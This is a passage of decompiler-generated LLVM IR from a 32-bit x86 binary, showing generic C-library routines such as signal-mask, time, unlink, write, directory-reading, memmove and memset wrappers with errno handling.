  %v2_804fd1d = phi i32 [ %v0_804fcf9, %dec_label_pc_804fcf9 ], [ %v2_804fd1d.pre, %dec_label_pc_804fd0d ]
  %v0_804fd19 = phi i32 [ %v1_804fd02, %dec_label_pc_804fcf9 ], [ -1, %dec_label_pc_804fd0d ]
  store i32 %v2_804fd1d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fd19

; uselistorder directives
  uselistorder i32 %v1_804fd02, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd19, { 1, 0 }
}

define i32 @function_804fd1f(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fd1f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fd20 = load i32, i32* @esi, align 4
  %v4_804fd24 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fd24, i32* @ecx, align 4
  %v2_804fd30 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_804fd30
  br i1 %or.cond, label %dec_label_pc_804fd49, label %dec_label_pc_804fd39

dec_label_pc_804fd39:                             ; preds = %dec_label_pc_804fd1f
  %v1_804fd39 = call i32 @function_804ffeb(i32 %v0_804fd20)
  %v1_804fd3e = inttoptr i32 %v1_804fd39 to i32*
  store i32 22, i32* %v1_804fd3e, align 4
  br label %dec_label_pc_804fd70

dec_label_pc_804fd49:                             ; preds = %dec_label_pc_804fd1f
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804fd4e = load i32, i32* @ebx, align 4
  %v7_804fd56 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804fd4e, i32* @ebx, align 4
  store i32 %v7_804fd56, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804fd56, -4095
  br i1 %tmp12, label %dec_label_pc_804fd70, label %dec_label_pc_804fd62

dec_label_pc_804fd62:                             ; preds = %dec_label_pc_804fd49
  %v1_804fd62 = call i32 @function_804ffeb(i32 %v0_804fd4e)
  %v0_804fd67 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fd67 = sub i32 0, %v0_804fd67
  %v2_804fd69 = inttoptr i32 %v1_804fd62 to i32*
  store i32 %v1_804fd67, i32* %v2_804fd69, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fd70

dec_label_pc_804fd70:                             ; preds = %dec_label_pc_804fd62, %dec_label_pc_804fd49, %dec_label_pc_804fd39
  %storemerge = phi i32 [ -1, %dec_label_pc_804fd39 ], [ %v7_804fd56, %dec_label_pc_804fd49 ], [ -1, %dec_label_pc_804fd62 ]
  %v2_804fd70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fd70, i32* @edx, align 4
  store i32 %v0_804fd20, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804fd56, { 1, 0, 2 }
  uselistorder i32 %v0_804fd4e, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804fd74() local_unnamed_addr {
dec_label_pc_804fd74:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd74 = load i32, i32* @edi, align 4
  store i32 %v0_804fd74, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_804fd7c = load i32, i32* @ebx, align 4
  %v1_804fd84 = inttoptr i32 %tmp to i32*
  %v2_804fd84 = call i32 @time(i32* %v1_804fd84)
  store i32 %v0_804fd7c, i32* @ebx, align 4
  store i32 %v2_804fd84, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804fd84, -4095
  br i1 %tmp9, label %dec_label_pc_804fd9c, label %dec_label_pc_804fd90

dec_label_pc_804fd90:                             ; preds = %dec_label_pc_804fd74
  %v1_804fd90 = call i32 @function_804ffeb(i32 %v0_804fd7c)
  %v0_804fd95 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd95 = sub i32 0, %v0_804fd95
  %v2_804fd97 = inttoptr i32 %v1_804fd90 to i32*
  store i32 %v1_804fd95, i32* %v2_804fd97, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fda0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd9c

dec_label_pc_804fd9c:                             ; preds = %dec_label_pc_804fd74, %dec_label_pc_804fd90
  %v2_804fda0 = phi i32 [ %v0_804fd74, %dec_label_pc_804fd74 ], [ %v2_804fda0.pre, %dec_label_pc_804fd90 ]
  %v0_804fd9c = phi i32 [ %v2_804fd84, %dec_label_pc_804fd74 ], [ -1, %dec_label_pc_804fd90 ]
  store i32 %v2_804fda0, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fd9c

; uselistorder directives
  uselistorder i32 %v2_804fd84, { 1, 0, 2 }
  uselistorder i32 %v0_804fd7c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804fd9c, { 1, 0 }
}

define i32 @function_804fda2(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fda2:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fda2 = load i32, i32* @edi, align 4
  store i32 %v0_804fda2, i32* %stack_var_-4, align 4
  %v4_804fda6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fda6, i32* %edi.global-to-local, align 4
  %v0_804fdaa = load i32, i32* @ebx, align 4
  %v3_804fdb2 = call i32 @unlink(i8* %arg1)
  store i32 %v3_804fdb2, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804fdb2, -4095
  br i1 %tmp9, label %dec_label_pc_804fdca, label %dec_label_pc_804fdbe

dec_label_pc_804fdbe:                             ; preds = %dec_label_pc_804fda2
  %v1_804fdbe = call i32 @function_804ffeb(i32 %v0_804fdaa)
  %v0_804fdc3 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fdc3 = sub i32 0, %v0_804fdc3
  %v2_804fdc5 = inttoptr i32 %v1_804fdbe to i32*
  store i32 %v1_804fdc3, i32* %v2_804fdc5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fdce.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fdca

dec_label_pc_804fdca:                             ; preds = %dec_label_pc_804fda2, %dec_label_pc_804fdbe
  %v2_804fdce = phi i32 [ %v0_804fda2, %dec_label_pc_804fda2 ], [ %v2_804fdce.pre, %dec_label_pc_804fdbe ]
  %v0_804fdca = phi i32 [ %v3_804fdb2, %dec_label_pc_804fda2 ], [ -1, %dec_label_pc_804fdbe ]
  store i32 %v2_804fdce, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fdca

; uselistorder directives
  uselistorder i32 %v3_804fdb2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fdca, { 1, 0 }
}

define i32 @function_804fdd0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fdd0:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fdd0 = load i32, i32* @edi, align 4
  store i32 %v0_804fdd0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fde0 = load i32, i32* @ebx, align 4
  %v4_804fde8 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804fde8, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fde8, -4095
  br i1 %tmp12, label %dec_label_pc_804fe00, label %dec_label_pc_804fdf4

dec_label_pc_804fdf4:                             ; preds = %dec_label_pc_804fdd0
  %v1_804fdf4 = call i32 @function_804ffeb(i32 %v0_804fde0)
  %v0_804fdf9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fdf9 = sub i32 0, %v0_804fdf9
  %v2_804fdfb = inttoptr i32 %v1_804fdf4 to i32*
  store i32 %v1_804fdf9, i32* %v2_804fdfb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fe04.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %dec_label_pc_804fdd0, %dec_label_pc_804fdf4
  %v2_804fe04 = phi i32 [ %v0_804fdd0, %dec_label_pc_804fdd0 ], [ %v2_804fe04.pre, %dec_label_pc_804fdf4 ]
  %v0_804fe00 = phi i32 [ %v4_804fde8, %dec_label_pc_804fdd0 ], [ -1, %dec_label_pc_804fdf4 ]
  store i32 %v2_804fe04, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fe00

; uselistorder directives
  uselistorder i32 %v4_804fde8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fe00, { 1, 0 }
}

define i32 @function_804fe06(i32* %arg1) local_unnamed_addr {
dec_label_pc_804fe06:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_804fe08 = load i32, i32* @ebx, align 4
  %v12_804fe09 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_804fe10 = load i32, i32* %arg1, align 4
  %v12_804fe10 = icmp eq i32 %v2_804fe10, -1
  %v1_804fe13 = icmp eq i1 %v12_804fe10, false
  br i1 %v1_804fe13, label %dec_label_pc_804fe25, label %dec_label_pc_804fe15

dec_label_pc_804fe15:                             ; preds = %dec_label_pc_804fe06
  %v1_804fe15 = call i32 @function_804ffeb(i32 %v0_804fe08)
  %v1_804fe1a = inttoptr i32 %v1_804fe15 to i32*
  store i32 9, i32* %v1_804fe1a, align 4
  br label %dec_label_pc_804fe6f

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe06
  %v1_804fe25 = add i32 %tmp3, 24
  store i32 %v12_804fe09, i32* @esi, align 4
  %v2_804fe34 = call i32 @function_805194a(i32 %v12_804fe09, i32 134551879)
  %v1_804fe3c = call i32 @function_8051947(i32 %v1_804fe25)
  store i32 %v1_804fe3c, i32* @eax, align 4
  %v0_804fe41 = load i32, i32* @edi, align 4
  %v1_804fe41 = inttoptr i32 %v0_804fe41 to i32*
  %v2_804fe41 = load i32, i32* %v1_804fe41, align 4
  store i32 %v2_804fe41, i32* @ebx, align 4
  store i32 -1, i32* %v1_804fe41, align 4
  %v2_804fe4e = call i32 @function_805194a(i32 %v12_804fe09, i32 1)
  %v0_804fe54 = load i32, i32* @edi, align 4
  %v1_804fe54 = add i32 %v0_804fe54, 12
  %v2_804fe54 = inttoptr i32 %v1_804fe54 to i32*
  %v3_804fe54 = load i32, i32* %v2_804fe54, align 4
  %v1_804fe57 = call i32 @function_80511e3(i32 %v3_804fe54)
  %v0_804fe5c = load i32, i32* @edi, align 4
  %v1_804fe5f = call i32 @function_80511e3(i32 %v0_804fe5c)
  %v0_804fe64 = load i32, i32* @ebx, align 4
  %v1_804fe67 = call i32 @function_804fab3(i32 %v0_804fe64)
  br label %dec_label_pc_804fe6f

dec_label_pc_804fe6f:                             ; preds = %dec_label_pc_804fe15, %dec_label_pc_804fe25
  %v0_804fe75 = phi i32 [ -1, %dec_label_pc_804fe15 ], [ %v1_804fe67, %dec_label_pc_804fe25 ]
  ret i32 %v0_804fe75

; uselistorder directives
  uselistorder label %dec_label_pc_804fe6f, { 1, 0 }
}

define i32 @function_804fe76(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fe76:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_804fe87 = inttoptr i32 %arg1 to i8*
  %v3_804fe87 = call i32 @function_804fbc4(i8* %v2_804fe87, i32 67584)
  store i32 %v3_804fe87, i32* %eax.global-to-local, align 4
  store i32 %v3_804fe87, i32* @edi, align 4
  %v2_804fe91 = icmp slt i32 %v3_804fe87, 0
  br i1 %v2_804fe91, label %dec_label_pc_804ff5e, label %dec_label_pc_804fe99

dec_label_pc_804fe99:                             ; preds = %dec_label_pc_804fe76
  %v0_804fe99 = load i32, i32* @ebx, align 4
  %v2_804fe9b = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_804fe9b, i32* %eax.global-to-local, align 4
  store i32 %v3_804fe87, i32* %stack_var_-124, align 4
  %v4_804fea1 = call i32 @function_8051d42(i32 %v3_804fe87, i32 %v2_804fe9b, i32 %v0_804fe99, i32 %v0_804fe99)
  store i32 %v4_804fea1, i32* %eax.global-to-local, align 4
  %v2_804fea9 = icmp slt i32 %v4_804fea1, 0
  br i1 %v2_804fea9, label %dec_label_pc_804febf, label %dec_label_pc_804fead

dec_label_pc_804fead:                             ; preds = %dec_label_pc_804fe99
  %v0_804feb2 = load i32, i32* @edi, align 4
  store i32 %v0_804feb2, i32* %stack_var_-124, align 4
  %v3_804feb3 = call i32 @function_804fa1d(i32 %v0_804feb2, i32 2, i32 1)
  store i32 %v3_804feb3, i32* %eax.global-to-local, align 4
  %v2_804febb = icmp slt i32 %v3_804feb3, 0
  %v1_804febd = icmp eq i1 %v2_804febb, false
  br i1 %v1_804febd, label %dec_label_pc_804fed5, label %dec_label_pc_804febf

dec_label_pc_804febf:                             ; preds = %dec_label_pc_804fead, %dec_label_pc_804fe99
  %v0_804febf = load i32, i32* %stack_var_-124, align 4
  %v1_804febf = call i32 @function_804ffeb(i32 %v0_804febf)
  store i32 %v1_804febf, i32* %eax.global-to-local, align 4
  store i32 %v1_804febf, i32* @ebx, align 4
  %v1_804fec9 = inttoptr i32 %v1_804febf to i32*
  %v2_804fec9 = load i32, i32* %v1_804fec9, align 4
  %v0_804fecb = load i32, i32* @edi, align 4
  store i32 %v0_804fecb, i32* %stack_var_-124, align 4
  %v1_804fecc = call i32 @function_804fab3(i32 %v0_804fecb)
  store i32 %v1_804fecc, i32* %eax.global-to-local, align 4
  %v1_804fed1 = load i32, i32* @ebx, align 4
  %v2_804fed1 = inttoptr i32 %v1_804fed1 to i32*
  store i32 %v2_804fec9, i32* %v2_804fed1, align 4
  br label %dec_label_pc_804ff4a

dec_label_pc_804fed5:                             ; preds = %dec_label_pc_804fead
  store i32 48, i32* %stack_var_-124, align 4
  %v1_804feda = call i32 @function_805041e(i32 48)
  store i32 %v1_804feda, i32* %eax.global-to-local, align 4
  store i32 %v1_804feda, i32* @ebx, align 4
  %v1_804fee4 = icmp eq i32 %v1_804feda, 0
  br i1 %v1_804fee4, label %dec_label_pc_804ff36, label %dec_label_pc_804fee8

dec_label_pc_804fee8:                             ; preds = %dec_label_pc_804fed5
  %v0_804fee8 = load i32, i32* @edi, align 4
  %v2_804fee8 = inttoptr i32 %v1_804feda to i32*
  store i32 %v0_804fee8, i32* %v2_804fee8, align 4
  %v1_804feea = add i32 %v1_804feda, 16
  %v2_804feea = inttoptr i32 %v1_804feea to i32*
  store i32 0, i32* %v2_804feea, align 4
  %v1_804fef1 = add i32 %v1_804feda, 8
  %v2_804fef1 = inttoptr i32 %v1_804fef1 to i32*
  store i32 0, i32* %v2_804fef1, align 4
  %v1_804fef8 = add i32 %v1_804feda, 4
  %v2_804fef8 = inttoptr i32 %v1_804fef8 to i32*
  store i32 0, i32* %v2_804fef8, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_804ff03 = load i32, i32* @ebx, align 4
  %v2_804ff03 = add i32 %v1_804ff03, 20
  %v3_804ff03 = inttoptr i32 %v2_804ff03 to i32*
  store i32 %tmp, i32* %v3_804ff03, align 4
  %v0_804ff06 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ff0b = icmp ugt i32 %v0_804ff06, 511
  br i1 %v6_804ff0b, label %dec_label_pc_804ff14, label %dec_label_pc_804ff0d

dec_label_pc_804ff0d:                             ; preds = %dec_label_pc_804fee8
  %v0_804ff0d = load i32, i32* @ebx, align 4
  %v1_804ff0d = add i32 %v0_804ff0d, 20
  %v2_804ff0d = inttoptr i32 %v1_804ff0d to i32*
  store i32 512, i32* %v2_804ff0d, align 4
  br label %dec_label_pc_804ff14

dec_label_pc_804ff14:                             ; preds = %dec_label_pc_804fee8, %dec_label_pc_804ff0d
  %v0_804ff14 = load i32, i32* @edx, align 4
  %v0_804ff16 = load i32, i32* @ebx, align 4
  %v1_804ff16 = add i32 %v0_804ff16, 20
  %v2_804ff16 = inttoptr i32 %v1_804ff16 to i32*
  %v3_804ff16 = load i32, i32* %v2_804ff16, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v5_804ff1b = call i32 @function_8050b92(i64 1, i32 %v3_804ff16, i32 %v0_804ff14, i32 %v0_804ff14)
  store i32 %v5_804ff1b, i32* %eax.global-to-local, align 4
  %v1_804ff23 = load i32, i32* @ebx, align 4
  %v2_804ff23 = add i32 %v1_804ff23, 12
  %v3_804ff23 = inttoptr i32 %v2_804ff23 to i32*
  store i32 %v5_804ff1b, i32* %v3_804ff23, align 4
  %v1_804ff26 = icmp eq i32 %v5_804ff1b, 0
  %v1_804ff28 = icmp eq i1 %v1_804ff26, false
  br i1 %v1_804ff28, label %dec_label_pc_804ff4e, label %dec_label_pc_804ff2a

dec_label_pc_804ff2a:                             ; preds = %dec_label_pc_804ff14
  %v0_804ff2d = load i32, i32* @ebx, align 4
  store i32 %v0_804ff2d, i32* %stack_var_-124, align 4
  %v1_804ff2e = call i32 @function_80511e3(i32 %v0_804ff2d)
  store i32 %v1_804ff2e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff36

dec_label_pc_804ff36:                             ; preds = %dec_label_pc_804fed5, %dec_label_pc_804ff2a
  %v0_804ff39 = load i32, i32* @edi, align 4
  store i32 %v0_804ff39, i32* %stack_var_-124, align 4
  %v1_804ff3a = call i32 @function_804fab3(i32 %v0_804ff39)
  store i32 %v1_804ff3a, i32* %eax.global-to-local, align 4
  %v1_804ff3f = call i32 @function_804ffeb(i32 %v0_804ff39)
  store i32 %v1_804ff3f, i32* %eax.global-to-local, align 4
  %v1_804ff44 = inttoptr i32 %v1_804ff3f to i32*
  store i32 12, i32* %v1_804ff44, align 4
  br label %dec_label_pc_804ff4a

dec_label_pc_804ff4a:                             ; preds = %dec_label_pc_804febf, %dec_label_pc_804ff36
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ff5b

dec_label_pc_804ff4e:                             ; preds = %dec_label_pc_804ff14
  %v0_804ff50 = load i32, i32* @ebx, align 4
  %v1_804ff50 = add i32 %v0_804ff50, 24
  store i32 %v1_804ff50, i32* %eax.global-to-local, align 4
  store i32 %v1_804ff50, i32* %stack_var_-124, align 4
  %v1_804ff56 = call i32 @function_8051947(i32 %v1_804ff50)
  store i32 %v1_804ff56, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff5b

dec_label_pc_804ff5b:                             ; preds = %dec_label_pc_804ff4a, %dec_label_pc_804ff4e
  br label %dec_label_pc_804ff5e

dec_label_pc_804ff5e:                             ; preds = %dec_label_pc_804fe76, %dec_label_pc_804ff5b
  %v0_804ff61 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff61, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ff61

; uselistorder directives
  uselistorder i32 %v5_804ff1b, { 1, 0, 2 }
  uselistorder i32 %v1_804feda, { 0, 5, 2, 1, 4, 3, 6 }
  uselistorder i32 %v1_804febf, { 1, 0, 2 }
  uselistorder i32 %v3_804fe87, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @function_804fab3, { 10, 9, 2, 8, 7, 4, 6, 3, 5, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ff5e, { 1, 0 }
  uselistorder label %dec_label_pc_804ff5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ff4a, { 1, 0 }
  uselistorder label %dec_label_pc_804ff36, { 1, 0 }
  uselistorder label %dec_label_pc_804ff14, { 1, 0 }
}

define i32 @function_804ff67(i32* %arg1) local_unnamed_addr {
dec_label_pc_804ff67:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_804ff70 = add i32 %tmp3, 24
  store i32 %v1_804ff70, i32* @ebx, align 4
  %v2_804ff79 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ff79, i32* @eax, align 4
  %v2_804ff7e = call i32 @function_805194a(i32 %v2_804ff79, i32 134551879)
  %v0_804ff83 = load i32, i32* @ebx, align 4
  %v1_804ff86 = call i32 @function_8051947(i32 %v0_804ff83)
  br label %dec_label_pc_804ff8e

dec_label_pc_804ff8e:                             ; preds = %dec_label_pc_804ffb9, %dec_label_pc_804ff67
  %v0_804ff8e = load i32, i32* @esi, align 4
  %v1_804ff8e = add i32 %v0_804ff8e, 8
  %v2_804ff8e = inttoptr i32 %v1_804ff8e to i32*
  %v3_804ff8e = load i32, i32* %v2_804ff8e, align 4
  %v2_804ff91 = add i32 %v0_804ff8e, 4
  %v3_804ff91 = inttoptr i32 %v2_804ff91 to i32*
  %v4_804ff91 = load i32, i32* %v3_804ff91, align 4
  %v6_804ff94 = icmp ugt i32 %v3_804ff8e, %v4_804ff91
  br i1 %v6_804ff94, label %dec_label_pc_804ffb9, label %dec_label_pc_804ff96

dec_label_pc_804ff96:                             ; preds = %dec_label_pc_804ff8e
  %v0_804ff96 = load i32, i32* @edx, align 4
  %v1_804ff97 = add i32 %v0_804ff8e, 20
  %v2_804ff97 = inttoptr i32 %v1_804ff97 to i32*
  %v3_804ff97 = load i32, i32* %v2_804ff97, align 4
  %v1_804ff9a = add i32 %v0_804ff8e, 12
  %v2_804ff9a = inttoptr i32 %v1_804ff9a to i32*
  %v3_804ff9a = load i32, i32* %v2_804ff9a, align 4
  %v1_804ff9d = inttoptr i32 %v0_804ff8e to i32*
  %v2_804ff9d = load i32, i32* %v1_804ff9d, align 4
  %v4_804ff9f = call i32 @function_8051d8a(i32 %v2_804ff9d, i32 %v3_804ff9a, i32 %v3_804ff97, i32 %v0_804ff96)
  %tmp13 = icmp slt i32 %v4_804ff9f, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_804ffaf, label %dec_label_pc_804ffab

dec_label_pc_804ffab:                             ; preds = %dec_label_pc_804ff96
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ffd5

dec_label_pc_804ffaf:                             ; preds = %dec_label_pc_804ff96
  %v1_804ffaf = load i32, i32* @esi, align 4
  %v2_804ffaf = add i32 %v1_804ffaf, 8
  %v3_804ffaf = inttoptr i32 %v2_804ffaf to i32*
  store i32 %v4_804ff9f, i32* %v3_804ffaf, align 4
  %v0_804ffb2 = load i32, i32* @esi, align 4
  %v1_804ffb2 = add i32 %v0_804ffb2, 4
  %v2_804ffb2 = inttoptr i32 %v1_804ffb2 to i32*
  store i32 0, i32* %v2_804ffb2, align 4
  %v0_804ffb9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ffb9

dec_label_pc_804ffb9:                             ; preds = %dec_label_pc_804ff8e, %dec_label_pc_804ffaf
  %v1_804ffc7 = phi i32 [ %v0_804ff8e, %dec_label_pc_804ff8e ], [ %v0_804ffb9.pre, %dec_label_pc_804ffaf ]
  %v1_804ffb9 = add i32 %v1_804ffc7, 4
  %v2_804ffb9 = inttoptr i32 %v1_804ffb9 to i32*
  %v3_804ffb9 = load i32, i32* %v2_804ffb9, align 4
  %v2_804ffbe = add i32 %v1_804ffc7, 12
  %v3_804ffbe = inttoptr i32 %v2_804ffbe to i32*
  %v4_804ffbe = load i32, i32* %v3_804ffbe, align 4
  %v5_804ffbe = add i32 %v4_804ffbe, %v3_804ffb9
  store i32 %v5_804ffbe, i32* @ebx, align 4
  %v1_804ffc1 = add i32 %v5_804ffbe, 8
  %v2_804ffc1 = inttoptr i32 %v1_804ffc1 to i16*
  %v3_804ffc1 = load i16, i16* %v2_804ffc1, align 2
  %v4_804ffc1 = zext i16 %v3_804ffc1 to i32
  store i32 %v4_804ffc1, i32* @edx, align 4
  %v2_804ffc5 = add i32 %v4_804ffc1, %v3_804ffb9
  store i32 %v2_804ffc5, i32* %v2_804ffb9, align 4
  %v0_804ffca = load i32, i32* @ebx, align 4
  %v1_804ffca = add i32 %v0_804ffca, 4
  %v2_804ffca = inttoptr i32 %v1_804ffca to i32*
  %v3_804ffca = load i32, i32* %v2_804ffca, align 4
  %v1_804ffcd = load i32, i32* @esi, align 4
  %v2_804ffcd = add i32 %v1_804ffcd, 16
  %v3_804ffcd = inttoptr i32 %v2_804ffcd to i32*
  store i32 %v3_804ffca, i32* %v3_804ffcd, align 4
  %v0_804ffd0 = load i32, i32* @ebx, align 4
  %v1_804ffd0 = inttoptr i32 %v0_804ffd0 to i32*
  %v2_804ffd0 = load i32, i32* %v1_804ffd0, align 4
  %v3_804ffd0 = icmp eq i32 %v2_804ffd0, 0
  br i1 %v3_804ffd0, label %dec_label_pc_804ff8e, label %dec_label_pc_804ffd5.loopexit

dec_label_pc_804ffd5.loopexit:                    ; preds = %dec_label_pc_804ffb9
  br label %dec_label_pc_804ffd5

dec_label_pc_804ffd5:                             ; preds = %dec_label_pc_804ffd5.loopexit, %dec_label_pc_804ffab
  store i32 %v2_804ff79, i32* @eax, align 4
  %v2_804ffde = call i32 @function_805194a(i32 %v2_804ff79, i32 1)
  %v0_804ffe3 = load i32, i32* @ebx, align 4
  ret i32 %v0_804ffe3

; uselistorder directives
  uselistorder i32 %v1_804ffc7, { 1, 0 }
  uselistorder i32 %v0_804ff8e, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_804ffb9, { 1, 0 }
}

define i32 @function_804ffeb(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ffeb:
  ret i32 ptrtoint (i32* @global_var_8053154.29 to i32)
}

define i32 @function_804fff1() local_unnamed_addr {
dec_label_pc_804fff1:
  %tmp = call i64 @__decompiler_undefined_function_6()
  %stack_var_-16 = alloca i32, align 4
  %v1_804fff9 = bitcast i32* %stack_var_-16 to %tms*
  %v2_804fff9 = call i32 @function_805215f(%tms* %v1_804fff9)
  %v4_804fffe = trunc i64 %tmp to i32
  %v4_8050002 = load i32, i32* %stack_var_-16, align 4
  %v5_8050002 = add i32 %v4_8050002, %v4_804fffe
  %v3_8050009 = mul i32 %v5_8050002, 10000
  %v1_805000f = and i32 %v3_8050009, 2147483632
  ret i32 %v1_805000f

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8050015(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050015:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8050016 = load i32, i32* @esi, align 4
  store i32 %v0_8050016, i32* %stack_var_-8, align 4
  %v4_8050017 = ptrtoint i8* %arg1 to i32
  %v9_8050023 = icmp ugt i8* %tmp3, %arg1
  %v1_8050025 = icmp eq i1 %v9_8050023, false
  br i1 %v1_8050025, label %dec_label_pc_805002d, label %dec_label_pc_8050027

dec_label_pc_8050027:                             ; preds = %dec_label_pc_8050015
  %v7_8050029 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_8050039

dec_label_pc_805002d:                             ; preds = %dec_label_pc_8050015
  %v3_805002d = add i32 %arg2, -1
  %v4_805002d = add i32 %v3_805002d, %arg3
  %v5_805002d = inttoptr i32 %v4_805002d to i8*
  %v3_8050031 = add i32 %v4_8050017, -1
  %v4_8050031 = add i32 %v3_8050031, %arg3
  %v5_8050031 = inttoptr i32 %v4_8050031 to i8*
  %v7_8050036 = call i8* @_memcpy(i8* %v5_8050031, i8* %v5_805002d, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8050039

dec_label_pc_8050039:                             ; preds = %dec_label_pc_8050027, %dec_label_pc_805002d
  %v2_8050039 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050039, i32* @esi, align 4
  ret i32 %v4_8050017

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050039, { 1, 0 }
}

define i32 @function_805003c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805003c:
  %v0_805003c = load i32, i32* @edi, align 4
  %v4_8050045 = ptrtoint i8* %arg1 to i32
  %v5_8050049 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805003c, i32* @edi, align 4
  ret i32 %v4_8050045

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_8050051(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050051:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050052 = load i32, i32* @esi, align 4
  store i32 %v0_8050052, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
